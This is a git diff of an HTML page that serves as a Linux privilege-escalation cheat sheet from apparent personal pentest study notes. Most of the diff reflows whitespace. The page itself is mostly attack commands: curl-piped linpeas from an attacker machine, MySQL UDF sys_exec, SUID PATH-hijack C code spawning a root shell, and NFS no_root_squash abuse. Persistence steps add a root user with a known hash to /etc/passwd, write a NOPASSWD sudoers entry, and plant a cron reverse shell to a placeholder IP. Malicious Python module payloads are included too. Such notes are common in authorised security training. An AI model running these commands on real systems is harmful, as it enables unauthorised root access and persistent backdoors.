@@ -2,6 +2,7 @@
 layout: default
 ---
 <html>
+
 <head>
     <title>Linux PrivEsc</title>
     <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
@@ -10,25 +11,26 @@ layout: default
 <hr>
 
 <body>
-    
+
     <h1>Linux PrivEsc</h1>
-    
+
     <hr>
-    
+
     <h2>PrivEsc Strategy</h2>
-    
+
     <li>Kernel Exploits</li>
     <ul>
         <li>searchsploit &lt;kernel version&gt;</li>
-        <li>If you think an exploit should work but it is not, then look up the CVE for the exploit and google it to search for others.</li>
+        <li>If you think an exploit should work but it is not, then look up the CVE for the exploit and google it to
+            search for others.</li>
     </ul>
-    
+
     <li>Check user id and groups</li>
     <ul>
         <li>id</li>
         <li>Google exploits for groups</li>
     </ul>
-    
+
     <li>Password attacks</li>
     <ul>
         <li>Password reuse</li>
@@ -39,11 +41,12 @@ layout: default
             <li>su &lt;user&gt;</li>
         </ul>
     </ul>
-    
+
     <li>Run linpeas</li>
     <ul>
         <li>Rerun as new user if a new on is accessed</li>
-        <li>If there is trouble downloading and running the script try piping to bash: curl &lt;url to kali machine/linpeas.sh&gt; | bash</li>
+        <li>If there is trouble downloading and running the script try piping to bash: curl &lt;url to kali
+            machine/linpeas.sh&gt; | bash</li>
         <ul>
             <li>This method also avoids using the victim's disk</li>
         </ul>
@@ -70,7 +73,7 @@ layout: default
             <li>/etc/apache2/sites-enabled</li>
         </ul>
     </ul>
-    
+
     <li>Look for running programs</li>
     <ul>
         <li>ps aux</li>
@@ -80,7 +83,7 @@ layout: default
             <li>If there is trouble enumerating versions, try googling the md5sum of the program</li>
         </ul>
     </ul>
-    
+
     <li>Network traffic</li>
     <ul>
         <li>Listen for traffic on localhost</li>
@@ -89,24 +92,39 @@ layout: default
             <li>Might find credentials being passed over the network</li>
         </ul>
     </ul>
-    
+
     <li>mysql</li>
     <ul>
         <li>If we can log in to it, look for sensitive information</li>
-        <li>Attempt run commands as the user that is logged into mysql</li>
+        <li>Attempt run commands as the user (preferably root) that is logged into mysql</li>
         <ul>
-            <li>i.e. If we have access to mysql and it is running under the context of root</li>
-            <li>raptor_udf</li>
-            <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so</li>
-            <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so</li>
+            <li>UDF Exploit</li>
+            <ul>
+                <li>Place a UDF exploit shared objects in the mysql plugins directory</li>
+                <ul>
+                    <li>Get plugins directory:
+                        <pre>SHOW VARIABLES LIKE &apos;plugin_dir&apos;;</pre>
+                    </li>
+                    <li>Shared Objects</li>
+                    <ul>
+                        <li>raptor_udf</li>
+                        <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so</li>
+                        <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+
+        <ul>
             <ul>
                 <li>select sys_exec('&lt;command&gt;');</li>
             </ul>
         </ul>
+
     </ul>
-    
+
     <li>If web page is running under the context of higher privilege user, try to create a web shell</li>
-    
+
     <li>Check network services</li>
     <ul>
         <li>Look for open ports/running services that didn't show during port scan</li>
@@ -117,7 +135,7 @@ layout: default
         <li>Check for port knocking configurations</li>
         <li>/etc/knockd.conf</li>
     </ul>
-    
+
     <li>Check for interesting programs</li>
     <ul>
         <li>PATH locations</li>
@@ -130,11 +148,11 @@ layout: default
         <ul>
             <li>getcap &lt;file&gt;</li>
             <ul>
-                <li>=en means root permissions.  As good as sudo</li>
+                <li>=en means root permissions. As good as sudo</li>
             </ul>
         </ul>
     </ul>
-    
+
     <li>Look for unmounted file systems</li>
     <li>SUID/GUID files</li>
     <ul>
@@ -144,29 +162,31 @@ layout: default
             <li>strace</li>
         </ul>
     </ul>
-    
+
     <li>File permissions</li>
-    
+
     <li>Sudo</li>
     <ul>
         <li>Check sudo permissions</li>
         <ul>
             <li>sudo -l</li>
             <li>Check sudo commands against GTFOBins</li>
-            <li>If sudo command shows (<another user>) in front of the command this means we are able to execute the command as another user</li>
-                <ul>
-                    <li>Execute sudo command as another user: sudo -u &lt;username&gt; &lt;sudo command&gt;</li>
-                </ul>
-            </ul>
-            <li>Environment Variables</li>
+            <li>If sudo command shows (<another user>) in front of the command this means we are able to execute the
+                    command as another user</li>
             <ul>
-                <li>Check with sudo -l</li>
-                <li>env_keep+=LD_PRELOAD - If this is set we can choose a shared object that is loaded before any others while running sudo</li>
-                <li>env_keep+=LD_LIBRARY_PATH - If this is set we can set where shared objects are searched for first.</li>
+                <li>Execute sudo command as another user: sudo -u &lt;username&gt; &lt;sudo command&gt;</li>
             </ul>
         </ul>
+        <li>Environment Variables</li>
+        <ul>
+            <li>Check with sudo -l</li>
+            <li>env_keep+=LD_PRELOAD - If this is set we can choose a shared object that is loaded before any others
+                while running sudo</li>
+            <li>env_keep+=LD_LIBRARY_PATH - If this is set we can set where shared objects are searched for first.</li>
+        </ul>
     </ul>
-    
+    </ul>
+
     <li>Cron Jobs</li>
     <ul>
         <li>Check cron PATH, see if we have write access to any directories.</li>
@@ -177,15 +197,18 @@ layout: default
         <ul>
             <li>Check if absolute paths are *not* being used</li>
             <ul>
-                <li>If so, try to create a malicious executable in PATH preceding PATH directory of the executable that is currently being used</li>
+                <li>If so, try to create a malicious executable in PATH preceding PATH directory of the executable that
+                    is currently being used</li>
             </ul>
         </ul>
         <li>Check commands using wildcards *</li>
         <ul>
-            <li>If so, create a file in the directory that the wildcard is being ran on.  Name this file as the malicious command line options you would like to use against this program.  Check GTFOBins to determine which flags to use.</li>
+            <li>If so, create a file in the directory that the wildcard is being ran on. Name this file as the malicious
+                command line options you would like to use against this program. Check GTFOBins to determine which flags
+                to use.</li>
         </ul>
     </ul>
-    
+
     <li>systemd timers</li>
     <ul>
         <li>New way to do cronjob on services</li>
@@ -195,11 +218,11 @@ layout: default
     <ul>
         <li>pspy</li>
     </ul>
-    
+
     <hr>
-    
+
     <h2>Manual Enumeration</h2>
-    
+
     <li>User info</li>
     <table>
         <tr>
@@ -226,9 +249,9 @@ layout: default
             <td>/etc/group</td>
         </tr>
     </table>
-    
+
     <li>Operating System & Kernel</li>
-    
+
     <table>
         <tr>
             <td>Show host</td>
@@ -276,9 +299,9 @@ layout: default
         </tr>
         <tr></tr>
     </table>
-    
+
     <li>Network</li>
-    
+
     <table>
         <tr>
             <td>Network interfaces and addresses</td>
@@ -296,11 +319,11 @@ layout: default
             </td>
         </tr>
     </table>
-    
+
     <hr>
-    
+
     <h2>File transfer</h2>
-    
+
     <li>Download to Linux</li>
     <table>
         <tr>
@@ -347,7 +370,7 @@ layout: default
                 <table>
                     <tr>
                         <td>Upload</td>
-                        <td>nc &lt;ip address&gt; &lt;port #&gt;  &lt; &lt;Upload File&gt;</td>
+                        <td>nc &lt;ip address&gt; &lt;port #&gt; &lt; &lt;Upload File&gt;</td>
                     </tr>
                     <tr>
                         <td>Download</td>
@@ -361,7 +384,7 @@ layout: default
             <td>scp &lt;user&gt;@&lt;ip address&gt;:&lt;file&gt; &lt;Directory to Download to&gt;</td>
         </tr>
     </table>
-    
+
     <li>Upload to Linux</li>
     <table>
         <tr>
@@ -414,11 +437,11 @@ layout: default
             <td>scp &lt;file to upload&gt; &lt;user&gt;@&lt;ip address&gt;:&lt;Directory to upload to&gt;</td>
         </tr>
     </table>
-    
+
     <hr>
-    
+
     <h2>Shell Upgrade and Escapes</h2>
-    
+
     <li>Upgrade</li>
     <table>
         <tr>
@@ -480,7 +503,9 @@ layout: default
         </tr>
         <tr>
             <td>Setting PATH variable</td>
-            <td>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:</td>
+            <td>export
+                PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:
+            </td>
         </tr>
         <tr>
             <td>Break out of rbash</td>
@@ -502,17 +527,19 @@ layout: default
             <td>import os<br>os.system("bash");</td>
         </tr>
     </table>
-    
+
     <li><a id="ssh">Setup an SSH Shell</a></li>
     <ul>
-        <li>An SSH shell will not always be possible.  SSH is frequently, but not always, configured to not allow SSH shells for certain users.</li>
+        <li>An SSH shell will not always be possible. SSH is frequently, but not always, configured to not allow SSH
+            shells for certain users.</li>
         <li>Create an SSH key</li>
         <ul>
             <li>run: ssh-keygen</li>
             <ul>
                 <li>When it prompts for a password just push enter</li>
                 <li>This will generate a public and a private key</li>
-                <li>The contents of the public key must be in a file call "authorized_keys" in a folder called .ssh in the users home directory.</li>
+                <li>The contents of the public key must be in a file call "authorized_keys" in a folder called .ssh in
+                    the users home directory.</li>
                 <ul>
                     <li>/home/&lt;user we have access to&gt;/.ssh/authorized_keys</li>
                 </ul>
@@ -528,11 +555,11 @@ layout: default
             <li>ssh &lt;user&gt;@&lt;victim ip&gt; -i &lt;private key file&gt;</li>
         </ul>
     </ul>
-    
+
     <hr>
-    
+
     <h2>Auto Enumeration Tools</h2>
-    
+
     <li>Kernel exploits</li>
     <ul>
         <li>Kernel exploits tool</li>
@@ -540,7 +567,7 @@ layout: default
             <li>Linux Exploit Suggester Script</li>
         </ul>
     </ul>
-    
+
     <li>PrivEsc Tools</li>
     <ul>
         <li>linpeas</li>
@@ -553,9 +580,9 @@ layout: default
         <li>https://github.com/linted/linuxprivchecker</li>
         <li>suid3num</li>
     </ul>
-    
+
     <hr>
-    
+
     <h2>Sudo Environment Variables</h2>
 
     <li>Sudo version</li>
@@ -575,16 +602,18 @@ layout: default
             </ul>
         </ul>
     </ul>
-    
+
     <li>LD_LIBRARY_PATH</li>
     <ul>
-        <li>LD_LIBRARY_PATH is an environment variable that contains the directories where shared libraries are searched for first.</li>
+        <li>LD_LIBRARY_PATH is an environment variable that contains the directories where shared libraries are searched
+            for first.</li>
         <ul>
             <li>ldd command will show the shared objects used by a program</li>
         </ul>
         <li>Create a new shared object with the same name as the one used by the program</li>
         <ul>
-            <li>Set the LD_LIBRARY_PATH to its directory to get the program to execute the new shared object instead.</li>
+            <li>Set the LD_LIBRARY_PATH to its directory to get the program to execute the new shared object instead.
+            </li>
             <li>Example:</li>
             <ul>
                 <li>ldd /usr/bin/apache2</li>
@@ -599,11 +628,11 @@ layout: default
             </ul>
         </ul>
     </ul>
-    
+
     <hr>
-    
+
     <h2>NFS</h2>
-    
+
     <table>
         <tr>
             <td>Show the NFS server’s export list</td>
@@ -618,15 +647,16 @@ layout: default
             <td>mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</td>
         </tr>
     </table>
-    
+
     <li>NFS share information is stored in /etc/exports</li>
     <li>Root Squashing</li>
     <ul>
-        <li>When connecting to an NFS share, if root squashing is enabled, then the owner of the files in the share will be set to "nobody".</li>
+        <li>When connecting to an NFS share, if root squashing is enabled, then the owner of the files in the share will
+            be set to "nobody".</li>
         <ul>
             <li>On victim machine:</li>
             <ul>
-                <li>Check /etc/exports to see if no_root_squash is listed.  If so, root squashing is disabled.</li>
+                <li>Check /etc/exports to see if no_root_squash is listed. If so, root squashing is disabled.</li>
             </ul>
             <li>On attack machine:</li>
             <ul>
@@ -648,11 +678,11 @@ layout: default
             </ul>
         </ul>
     </ul>
-    
+
     <hr>
-    
+
     <h2>SUID and GUID executables</h2>
-    
+
     <table>
         <tr>
             <td>Find files with guid or suid set</td>
@@ -678,7 +708,7 @@ layout: default
             <td>ldconfig</td>
         </tr>
     </table>
-    
+
     <li>Check GTFOBins for flags to use in order to execute malicious commands</li>
     <li>Binary being called is not absolute (scp vs /usr/bin/scp)</li>
     <li>Shared object not found</li>
@@ -701,72 +731,75 @@ layout: default
             </ul>
         </ul>
     </ul>
-    
+
     <li>File calls for executable without absolute path</li>
     <ul>
         <li>We can add a malicious version of the executable to our PATH.</li>
-        <li>Create a malicious executable with the same name as the program that is being called without an absolute path</li>
+        <li>Create a malicious executable with the same name as the program that is being called without an absolute
+            path</li>
         <pre>&#13;&#10;int main() {&#13;&#10;    setuid(0);&#13;&#10;    system(&quot;/bin/bash -p&quot;);&#13;&#10;}&#13;&#10;#gcc -o &lt;file&gt; &lt;file.c&gt;&#13;&#10;        </pre>
         <li>PATH=.:$PATH</li>
         <li>Execute vulnerable SUID/GUID</li>
         <li>Rooted</li>
     </ul>
-    
+
     <li>Calls for executable w/ absolute path and bash < 4.2-048</li>
-    <ul>
-        <li>function &lt;exectuable being called&gt; { /bin/bash -p; }</li>
-        <li>export -f &lt;exectuable being called&gt;</li>
-        <li>execute vulnerable suid/guid file</li>
-        <li>Rooted</li>
-    </ul>
-    
-    <hr>
-    
-    <h2>Persistence Methods</h2>
+            <ul>
+                <li>function &lt;exectuable being called&gt; { /bin/bash -p; }</li>
+                <li>export -f &lt;exectuable being called&gt;</li>
+                <li>execute vulnerable suid/guid file</li>
+                <li>Rooted</li>
+            </ul>
+
+            <hr>
+
+            <h2>Persistence Methods</h2>
+            <table>
+                <tr>
+                    <td>Add new root to /etc/passwd</td>
+                    <td>
+    <li>echo &quot;root2:&lt;hash&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
     <table>
         <tr>
-            <td>Add new root to /etc/passwd</td>
-            <td>
-                <li>echo &quot;root2:&lt;hash&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
-                <table>
-                    <tr>
-                        <td>Generate new password hash</td>
-                        <td>openssl passwd &lt;password&gt;</td>
-                    </tr>
-                </table>
-                <li>echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
-                <ul>
-                    <li>password = root</li>
-                </ul>
-                <li>su root2</li>
-            </td>
-        </tr>
-        <tr>
-            <td>Add user to /etc/sudoers</td>
-            <td>echo &quot;&lt;user&gt;                  ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers</td>
-        </tr>
-        <tr>
-            <td>SUID Bash</td>
-            <td>
-                <li>cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash</li>
-                <li>./rootbash -p</li>
-            </td>
-        </tr>
-        <tr>
-            <td>Malicious Cronjob</td>
-            <td>echo &quot;* * * * * root /bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port #&gt; 0&gt;&amp;1&#039; &quot;</td>
+            <td>Generate new password hash</td>
+            <td>openssl passwd &lt;password&gt;</td>
         </tr>
     </table>
-    
+    <li>echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
+    <ul>
+        <li>password = root</li>
+    </ul>
+    <li>su root2</li>
+    </td>
+    </tr>
+    <tr>
+        <td>Add user to /etc/sudoers</td>
+        <td>echo &quot;&lt;user&gt; ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers</td>
+    </tr>
+    <tr>
+        <td>SUID Bash</td>
+        <td>
+            <li>cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash</li>
+            <li>./rootbash -p</li>
+        </td>
+    </tr>
+    <tr>
+        <td>Malicious Cronjob</td>
+        <td>echo &quot;* * * * * root /bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port #&gt;
+            0&gt;&amp;1&#039; &quot;</td>
+    </tr>
+    </table>
+
     <hr>
-    
+
     <h2>Groups</h2>
-    
+
     <li>Video</li>
     <ul>
         <li>The video group gives us access to screen output</li>
         <ul>
-            <li>Privesc usage example: If a user has a credential showing on their screen we can look at the screen image and view the credential.</li>
+            <li>Privesc usage example: If a user has a credential showing on their screen we can look at the screen
+                image and view the credential.</li>
         </ul>
         <li>How to view screen output</li>
         <ul>
@@ -780,18 +813,20 @@ layout: default
                     <td>cat /sys/class/graphics/fb0/virtual_size</td>
                 </tr>
             </table>
-            <li>Open screen.raw using gimp.  File &gt; Open... &gt;  Select File Type: Raw image data &gt; (check) Show All Files Files &gt; (click on/open) screen.raw</li>
+            <li>Open screen.raw using gimp. File &gt; Open... &gt; Select File Type: Raw image data &gt; (check) Show
+                All Files Files &gt; (click on/open) screen.raw</li>
             <li>Set width and height to what is shown in /sys/class/graphics/fb0/virtual_size</li>
             <li>Change "Image Type:" until a clear image is shown.</li>
         </ul>
     </ul>
-    
+
     <hr>
-    
+
     <h2>Malicious Python Module</h2>
-    
-    <li>If a script is being ran by root and we have write permissions to a module that the script is importing then we can get root command execution by modifying the module being imported.</li>
-    
+
+    <li>If a script is being ran by root and we have write permissions to a module that the script is importing then we
+        can get root command execution by modifying the module being imported.</li>
+
     <table>
         <tr>
             <td>
@@ -833,15 +868,16 @@ layout: default
         <tr>
             <td>Malicious payloads</td>
             <td>
-                
+
                 <li>Spawn root shell</li>
                 <pre>import os&#13;&#10;import pty&#13;&#10;&#13;&#10;os.setuid(0)&#13;&#10;pty.spawn(&quot;bash&quot;)</pre>
                 <li>Execute malicious bash command</li>
                 <pre>import os&#13;&#10;&#13;&#10;os.system(&quot;&lt;malicious bash command&gt;&quot;);</pre>
-                
+
             </td>
         </tr>
     </table>
-    
+
 </body>
+
 </html>
